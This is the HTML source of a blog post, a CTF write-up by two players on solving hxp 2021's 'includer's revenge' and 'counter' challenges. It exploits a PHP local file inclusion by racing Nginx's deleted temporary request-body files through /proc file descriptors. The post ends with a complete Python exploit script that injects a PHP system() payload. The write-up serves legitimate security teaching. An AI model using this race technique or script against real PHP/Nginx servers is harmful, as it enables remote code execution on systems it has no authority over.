@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Winning the Impossible Race – An Unintended Solution for Includer’s Revenge / Counter (hxp 2021) | Guy Lewin’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="Winning the Impossible Race – An Unintended Solution for Includer’s Revenge / Counter (hxp 2021)" />
+<meta name="author" content="Guy Lewin and Eyal Daniel" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In December 2021 Eyal Daniel and me (Guy Lewin) participated in hxp CTF 2021 on behalf of “pasten” group. We found an LFI exploit relying solely on PHP including a file running alongside Nginx." />
+<meta property="og:description" content="In December 2021 Eyal Daniel and me (Guy Lewin) participated in hxp CTF 2021 on behalf of “pasten” group. We found an LFI exploit relying solely on PHP including a file running alongside Nginx." />
+<link rel="canonical" href="https://lewin.co.il/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021.html" />
+<meta property="og:url" content="https://lewin.co.il/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021.html" />
+<meta property="og:site_name" content="Guy Lewin’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-12-27T21:32:49+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Winning the Impossible Race – An Unintended Solution for Includer’s Revenge / Counter (hxp 2021)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Guy Lewin and Eyal Daniel"},"dateModified":"2021-12-27T21:32:49+00:00","datePublished":"2021-12-27T21:32:49+00:00","description":"In December 2021 Eyal Daniel and me (Guy Lewin) participated in hxp CTF 2021 on behalf of “pasten” group. We found an LFI exploit relying solely on PHP including a file running alongside Nginx.","headline":"Winning the Impossible Race – An Unintended Solution for Includer’s Revenge / Counter (hxp 2021)","mainEntityOfPage":{"@type":"WebPage","@id":"https://lewin.co.il/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021.html"},"url":"https://lewin.co.il/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://lewin.co.il/feed.xml" title="Guy Lewin's Blog" />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-YEJ89F03YG"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-YEJ89F03YG');
+</script>
+<script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Guy Lewin&#39;s Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/GuyLevin"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/GuyLewin"><i class="fab fa-github-square"></i></a>
+        
+        
+        
+        <a class="color-green-hover" href="https://www.linkedin.com/in/guy-lewin-48b00712/"><i class="fab fa-linkedin"></i></a>
+        
+        
+        
+        <a class="color-indigo-hover" href="mailto:contact@lewin.co.il"><i class="fa fa-envelope-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    https://github.com/GuyLewin.png
+" class="author-avatar" alt="Avatar" />
+<div class="description">Documenting things I found useful.</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Winning the Impossible Race &#8211; An Unintended Solution for Includer’s Revenge / Counter (hxp 2021)</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/ctf/">ctf</a>
+      
+      <a class="tag" href="/tag/exploit/">exploit</a>
+      
+      <a class="tag" href="/tag/hxp/">hxp</a>
+      
+      <a class="tag" href="/tag/lfi/">lfi</a>
+      
+      <a class="tag" href="/tag/nginx/">nginx</a>
+      
+      <a class="tag" href="/tag/pasten/">pasten</a>
+      
+      <a class="tag" href="/tag/php/">php</a>
+      
+      <a class="tag" href="/tag/unintended/">unintended</a>
+      
+  </div>
+  
+  <div class="post-date">
+    Published on 27 Dec 2021
+    
+    by Guy Lewin and Eyal Daniel
+    
+  </div>
+  
+  <p>In December 2021 Eyal Daniel and me (Guy Lewin) participated in <a href="https://2021.ctf.link/">hxp CTF 2021</a> on behalf of “<a href="https://ctftime.org/team/6965">pasten</a>” group. We found an LFI exploit relying solely on PHP including a file running alongside Nginx.</p>
+
+<h2 id="the-challenges">The Challenges</h2>
+
+<p>The recent hxp CTF brought us some great challenges, 2 of those challenges were <code class="language-plaintext highlighter-rouge">includer's revenge</code> and <code class="language-plaintext highlighter-rouge">counter</code> - hard and medium web-challenges respectively.</p>
+
+<p>While trying to solve <code class="language-plaintext highlighter-rouge">includer's revenge</code> we managed to find an awesome and incredibly hard to exploit solution that was also working on the second challenge (<code class="language-plaintext highlighter-rouge">counter</code>). Both of these challenges are based on the <code class="language-plaintext highlighter-rouge">LFI (Local File Inclusion)</code> concept, like familiar challenges from previous years. <code class="language-plaintext highlighter-rouge">LFI</code> is a highly documented and known category of vulnerabilities and this year’s challenges are making it a bit harder to exploit than usual.</p>
+
+<h2 id="includers-revenge">includer’s revenge</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'read'</span> <span class="p">)</span> <span class="o">===</span> <span class="s1">'read'</span> <span class="o">?</span> <span class="nb">readfile</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'index.php'</span><span class="p">)</span> <span class="o">:</span> <span class="k">include_once</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'index.php'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>A very basic PHP endpoint that either reads a file, or includes it. The typical challenge is creating a local file on the server that contains a malicious PHP code. There are many documented methods to do this, the most naive one is simply using an existing upload mechanism in the targeted website. Given the simplicity of this challenge (the above code is the entire logic behind the target server) - we need a different kind of approach.</p>
+
+<h2 id="environment-caches-sessions-and-what-not">Environment, Caches, Sessions and What Not</h2>
+
+<p>This kind of approach takes advantage of dynamically generated files that are created in various ways using different features and situations in the underlying framework and environment. For example - inserting a log record to a running application’s log file might actually make the log file a valid PHP page! Imagine browsing to <code class="language-plaintext highlighter-rouge">/&lt;?php ... ?&gt;</code>, suddenly - the Nginx log file can be included and trigger logic controlled by the attacker.</p>
+
+<h2 id="the-hardened-setup">The Hardened Setup</h2>
+
+<p>On top of the source code - we are also given the <code class="language-plaintext highlighter-rouge">Dockerfile</code> for creating a local instance of the challenge. Below is the <code class="language-plaintext highlighter-rouge">Dockerfile</code> used in <code class="language-plaintext highlighter-rouge">includer's revenge</code>, the difference between it and <code class="language-plaintext highlighter-rouge">counter</code>‘s is irrelevant for our exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RUN <span class="nb">chown</span> <span class="nt">-R</span> root:root /var/www <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    find /var/www <span class="nt">-type</span> d <span class="nt">-exec</span> <span class="nb">chmod </span>555 <span class="o">{}</span> <span class="se">\;</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    find /var/www <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">chmod </span>444 <span class="o">{}</span> <span class="se">\;</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    <span class="nb">chown</span> <span class="nt">-R</span> root:root /tmp /var/tmp /var/lib/php/sessions <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    <span class="nb">chmod</span> <span class="nt">-R</span> 000 /tmp /var/tmp /var/lib/php/sessions
+
+RUN <span class="nb">ln</span> <span class="nt">-sf</span> /dev/stdout /var/log/nginx/access.log <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    <span class="nb">ln</span> <span class="nt">-sf</span> /dev/stderr /var/log/nginx/error.log
+
+RUN find / <span class="nt">-ignore_readdir_race</span> <span class="nt">-type</span> f <span class="se">\(</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-2000</span> <span class="se">\)</span> <span class="nt">-not</span> <span class="nt">-wholename</span> /readflag <span class="nt">-delete</span>
+</code></pre></div></div>
+
+<p>We notice several things when looking at the file. PHP doesn’t have permissions to write into its sessions directory, which prevents us from setting a PHP session with malicious code into a session file. In addition, when PHP creates temporary files (for buffering, or <code class="language-plaintext highlighter-rouge">php://temp</code> for example) it runs the <code class="language-plaintext highlighter-rouge">php_get_temporary_directory()</code> function to resolve the temp directory. Sadly, in this setup the result is always <code class="language-plaintext highlighter-rouge">/tmp</code>. Since PHP can’t write into it (see <code class="language-plaintext highlighter-rouge">Dockerfile</code> above) - we didn’t go in this direction.</p>
+
+<p>On top of that - Nginx’s log files are redirected to <code class="language-plaintext highlighter-rouge">stdout</code> and <code class="language-plaintext highlighter-rouge">stderr</code> which means that there are no logs on the filesystem (i.e. we can’t use Nginx access / errors to write malicious code into a file).</p>
+
+<h2 id="ignoring-the-obvious">Ignoring the Obvious</h2>
+
+<p>When you’re doing enough challenges, you learn to spot the important parts of the challenge - the little clues that are right in front of you, the configuration that should not be there, the misplaced <code class="language-plaintext highlighter-rouge">"</code>, the unusual choice of words in the description.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">...</span> <span class="nb">readfile</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'index.php'</span><span class="p">)</span> <span class="o">:</span> <span class="k">include_once</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="mf">...</span>
+</code></pre></div></div>
+
+<p>The challenge consists of two major parts - <code class="language-plaintext highlighter-rouge">readfile()</code> and <code class="language-plaintext highlighter-rouge">include_once()</code>. At first sight, it seems like we were meant to leverage <code class="language-plaintext highlighter-rouge">readfile()</code> for somehow placing a file and <code class="language-plaintext highlighter-rouge">include_once()</code> to execute it. Having said that, completely aware of the path we’re supposed to walk in, we chose to go in a completely different way.</p>
+
+<h2 id="the-pasten-way">The Pasten Way</h2>
+
+<p>There is nothing like solving a challenge in an unintended way! Trying to find different types of dynamic files, we decided to look into Nginx as a target. The first Google result for <code class="language-plaintext highlighter-rouge">"nginx tempfile"</code> was actually a breakthrough, revealing Nginx <strong>does</strong> create temporary files (mainly because people were complaining about permission errors).</p>
+
+<p>When we read more about it, we found the following documentation:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>client_body_buffer_size:
+Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.
+</code></pre></div></div>
+
+<p>Sound good doesn’t it? Testing this behavior was a little tricky since we never actually saw these files on the filesystem. This behavior can be easily explained when looking at the relevant source code in Nginx:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ngx_open_tempfile</span><span class="p">(</span><span class="n">u_char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="n">ngx_uint_t</span> <span class="n">persistent</span><span class="p">,</span> <span class="n">ngx_uint_t</span> <span class="n">access</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ngx_fd_t</span>  <span class="n">fd</span><span class="p">;</span>
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">name</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_EXCL</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span>
+              <span class="n">access</span> <span class="o">?</span> <span class="n">access</span> <span class="o">:</span> <span class="mo">0600</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">persistent</span><span class="p">)</span> <span class="p">{</span>
+        <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">unlink</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">name</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As you can see, the temporary file is created, then <strong>immediately</strong> deleted! This is a hell of a race to win. Nevertheless we decided to go for it.</p>
+
+<p>The temporary file name will be a (10 digit 0-padded) sequential number that isn’t really predictable (it’s directly based on the number of previously handled buffered bodies at the time the request is processed).</p>
+
+<p>Luckily - we can use <code class="language-plaintext highlighter-rouge">/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code> to access these files through the open file descriptors of the Nginx worker processes! In order to easily test this behavior we simply generated a request that is larger than <code class="language-plaintext highlighter-rouge">16K</code> and made sure to keep the request going - sending the data byte by byte to leave the <code class="language-plaintext highlighter-rouge">fd</code> open.</p>
+
+<p>The weird thing about file descriptors in procfs is that they (in a way) behave both as symlinks and hardlinks. If a file was deleted while a process holds an open file descriptor:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">realpath()</code> will return the last path of the file with <code class="language-plaintext highlighter-rouge">" (deleted)"</code> appended to it.</li>
+  <li><code class="language-plaintext highlighter-rouge">open()</code> will return an <code class="language-plaintext highlighter-rouge">fd</code> that can be used to read the original file content.</li>
+</ul>
+
+<p>Using this method we could potentially use the Nginx file descriptor to access the temporary file and include its content (which is completely controlled by us).</p>
+
+<p>Unfortunately, PHP identifies the file descriptor as a symlink and thus attempts to resolve it’s link, as shown in the <code class="language-plaintext highlighter-rouge">php-core</code> snippet below:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="p">(</span><span class="o">*</span><span class="n">ll</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">LINK_MAX</span> <span class="o">||</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">php_sys_readlink</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">MAXPATHLEN</span><span class="p">))</span> <span class="o">==</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+	<span class="p">...</span>    
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This means that PHP has to resolve the link and open the file between the creation and deletion of the temporary file by Nginx (which, as shown above, is literally 2 lines of code apart).</p>
+
+<p>So, the optimists will claim that a race is a race and it’s always exploitable (and they will be right!). Sadly, it’s not that easy.</p>
+
+<p>While attempting to exploit, we noticed that after resolving a link - PHP caches the resolution by default.</p>
+
+<p><img src="/assets/images/posts/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/1.png" alt="" /></p>
+
+<p>This is important because realistically, we will fail <em>many</em> times before winning the Nginx open + delete race. If we loop through every file descriptor number before succeeding, we are inserting the broken links to the cache and thus preventing us from accessing this file descriptor number again. When PHP resolves a link to a deleted file, it puts its path + <code class="language-plaintext highlighter-rouge">" (deleted)"</code> in the cache, and will not try to resolve it again until the TTL or the cache size has been exceeded.</p>
+
+<p>To overcome this “feature” we decided to implement a straightforward bypass. Instead of attempting to access the same path over and over (through <code class="language-plaintext highlighter-rouge">/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code>) we thought about using a simple trick to access it in countless different ways:</p>
+
+<p>If we could find multiple different paths that link to the root directory, we can use them to build unique paths to our file descriptors.</p>
+
+<p>Even though <code class="language-plaintext highlighter-rouge">/proc/&lt;some nginx worker pid&gt;/root/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code> and <code class="language-plaintext highlighter-rouge">/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code> resolve to the same path - adding the randomly generated prefixes makes the PHP realpath cache irrelevant. We use a random amount of <code class="language-plaintext highlighter-rouge">/proc/&lt;some nginx pid&gt;/root</code> and <code class="language-plaintext highlighter-rouge">/proc/&lt;some nginx pid&gt;/cwd</code> as components to build the path prefix since they all lead to <code class="language-plaintext highlighter-rouge">/</code>.</p>
+
+<p>This method is unique and is based on the underlying filesystem and operating system - making it harder to mitigate and patch.</p>
+
+<p>Equipped with these strategies we tried to retrieve the flag and after about 3~ minutes we consistently managed to <code class="language-plaintext highlighter-rouge">include_once()</code> the temporary file that contains our malicious payload in <code class="language-plaintext highlighter-rouge">includer's revenge</code>!</p>
+
+<h2 id="exploit-implementation">Exploit Implementation</h2>
+
+<p>We’ve used the following Python script to solve <code class="language-plaintext highlighter-rouge">includer's revenge</code> (and a slightly modified version for <code class="language-plaintext highlighter-rouge">counter</code>):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">multiprocessing</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="n">SERVER</span> <span class="o">=</span> <span class="s">"http://localhost:8088"</span>
+<span class="n">NGINX_PIDS_CACHE</span> <span class="o">=</span> <span class="nb">set</span><span class="p">([</span><span class="mi">34</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">41</span><span class="p">])</span>
+<span class="c1"># Set the following to True to use the above set of PIDs instead of scanning:
+</span><span class="n">USE_NGINX_PIDS_CACHE</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">create_requests_session</span><span class="p">():</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="c1"># Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead
+</span>    <span class="n">adapter</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">adapters</span><span class="p">.</span><span class="n">HTTPAdapter</span><span class="p">(</span><span class="n">pool_connections</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span> <span class="n">pool_maxsize</span><span class="o">=</span><span class="mi">10000</span><span class="p">)</span>
+    <span class="n">session</span><span class="p">.</span><span class="n">mount</span><span class="p">(</span><span class="s">'http://'</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">session</span>
+
+<span class="k">def</span> <span class="nf">get_nginx_pids</span><span class="p">(</span><span class="n">requests_session</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">USE_NGINX_PIDS_CACHE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">NGINX_PIDS_CACHE</span>
+    <span class="n">nginx_pids</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
+    <span class="c1"># Scan up to PID 200
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">200</span><span class="p">):</span>
+        <span class="n">cmdline</span> <span class="o">=</span> <span class="n">requests_session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/?action=read&amp;file=/proc/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">/cmdline"</span><span class="p">).</span><span class="n">text</span>
+        <span class="k">if</span> <span class="n">cmdline</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"nginx: worker process"</span><span class="p">):</span>
+            <span class="n">nginx_pids</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">nginx_pids</span>
+
+<span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">body_size</span><span class="o">=</span><span class="mi">1024000</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># The file path (/bla) doesn't need to exist - we simply need to upload a large body to Nginx and fail fast
+</span>        <span class="n">payload</span> <span class="o">=</span> <span class="s">'&lt;?php system("/readflag"); ?&gt; //'</span>
+        <span class="n">requests_session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span> <span class="o">+</span> <span class="s">"/?action=read&amp;file=/bla"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="p">(</span><span class="s">"a"</span> <span class="o">*</span> <span class="p">(</span><span class="n">body_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">send_payload_worker</span><span class="p">(</span><span class="n">requests_session</span><span class="p">):</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">send_payload</span><span class="p">(</span><span class="n">requests_session</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">send_payload_multiprocess</span><span class="p">(</span><span class="n">requests_session</span><span class="p">):</span>
+    <span class="c1"># Use all CPUs to send the payload as request body for Nginx
+</span>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">multiprocessing</span><span class="p">.</span><span class="n">cpu_count</span><span class="p">()):</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">send_payload_worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,))</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">generate_random_path_prefix</span><span class="p">(</span><span class="n">nginx_pids</span><span class="p">):</span>
+    <span class="c1"># This method creates a path from random amount of ProcFS path components. A generated path will look like /proc/&lt;nginx pid 1&gt;/cwd/proc/&lt;nginx pid 2&gt;/root/proc/&lt;nginx pid 3&gt;/root
+</span>    <span class="n">path</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">component_num</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">component_num</span><span class="p">):</span>
+        <span class="n">pid</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">nginx_pids</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">path</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">"/proc/</span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s">/cwd"</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">path</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">"/proc/</span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s">/root"</span>
+    <span class="k">return</span> <span class="n">path</span>
+
+<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pid</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">):</span>
+    <span class="n">nginx_pid_list</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">nginx_pids</span><span class="p">)</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">generate_random_path_prefix</span><span class="p">(</span><span class="n">nginx_pid_list</span><span class="p">)</span>
+        <span class="n">path</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">"/proc/</span><span class="si">{</span><span class="n">nginx_pid</span><span class="si">}</span><span class="s">/fd/</span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s">"</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">d</span> <span class="o">=</span> <span class="n">requests_session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/?action=include&amp;file=</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s">"</span><span class="p">).</span><span class="n">text</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">continue</span>
+        <span class="c1"># Flags are formatted as hxp{&lt;flag&gt;}
+</span>        <span class="k">if</span> <span class="s">"hxp"</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"Found flag! "</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">read_file_worker</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pid</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">):</span>
+    <span class="c1"># Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it's very common for the request body FD to open within this range
+</span>    <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">45</span><span class="p">):</span>
+        <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pid</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">))</span>
+        <span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">read_file_multiprocess</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">nginx_pid</span> <span class="ow">in</span> <span class="n">nginx_pids</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read_file_worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pid</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">))</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[DEBUG] Creating requests session'</span><span class="p">)</span>
+    <span class="n">requests_session</span> <span class="o">=</span> <span class="n">create_requests_session</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[DEBUG] Getting Nginx pids'</span><span class="p">)</span>
+    <span class="n">nginx_pids</span> <span class="o">=</span> <span class="n">get_nginx_pids</span><span class="p">(</span><span class="n">requests_session</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[DEBUG] Nginx pids: </span><span class="si">{</span><span class="n">nginx_pids</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[DEBUG] Starting payload sending'</span><span class="p">)</span>
+    <span class="n">send_payload_multiprocess</span><span class="p">(</span><span class="n">requests_session</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[DEBUG] Starting fd readers'</span><span class="p">)</span>
+    <span class="n">read_file_multiprocess</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">)</span>
